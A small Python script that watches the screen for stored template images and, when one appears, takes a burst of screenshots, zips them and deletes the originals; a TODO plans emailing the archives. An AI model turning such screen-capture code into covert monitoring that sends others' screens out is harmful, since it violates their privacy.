import time, os, sys
import pyautogui, pyscreeze
import zipfile

''' Thing to do in order of importance'''

#TODO if a folder doesn't exist, create it
#TODO add images to the source folder while the software is running
#TODO implement email attachments

class Directories(object):
	__slots__ = ['current' ,'find', 'screenshots', 'compressed']
	def __init__(self):
		self.current = os.path.dirname(os.path.realpath(__file__))
		self.find = self.current + '/find/'
		self.screenshots = self.current + '/screenshots/'
		self.compressed = self.current + '/compressed/'

dir = Directories()

def getCurrentDateTime():
	current_date_time = time.localtime()
	formatted_time = time.strftime('%Y%m%d-%H%M%S', current_date_time)
	return formatted_time

def deleteImages():
	for file in os.listdir(dir.screenshots):
		if file.endswith('.png'):
			os.remove(os.path.join(dir.screenshots, file))

def createZip():
	date_time = getCurrentDateTime()
	zip_file = zipfile.ZipFile(dir.compressed + 'images_' + date_time + '.zip', mode='w', compression=zipfile.ZIP_DEFLATED)
	for file in os.listdir(dir.screenshots):
		if file.endswith('.png'):
			zip_file.write(os.path.join(dir.screenshots, file))
	zip_file.close()

def takeScreenshots(amount, interval):
	for i in range(0, amount):
		date_time = getCurrentDateTime()
		pyautogui.screenshot(dir.screenshots + 'image' + str(i + 1) + '_' + date_time +'.png')
		time.sleep(interval)

if __name__ == '__main__':
	i = 0
	source_files = [file for file in os.listdir(dir.find) if file.endswith('.png') or file.endswith('.jpg')]
	while True:
		try:
			i = i % len(source_files)
			if i < len(source_files):
				pyautogui.locateOnScreen(os.path.join(dir.find, source_files[i]), confidence = 0.9) # find the image on screen with a confidence of 90%
				takeScreenshots(10, 4) # When it's found take 10 screenshots with a interval of 4 seconds
				createZip()
				deleteImages()
		except pyscreeze.ImageNotFoundException:
			i += 1
			time.sleep(1) # Reduces the cpu usage by about 10% while the image isn't found. Total usage between 3.5% and 5%
			continue
		except ZeroDivisionError:
			print('Error: The source folder does not containg any .png file to look for.')
			sys.exit()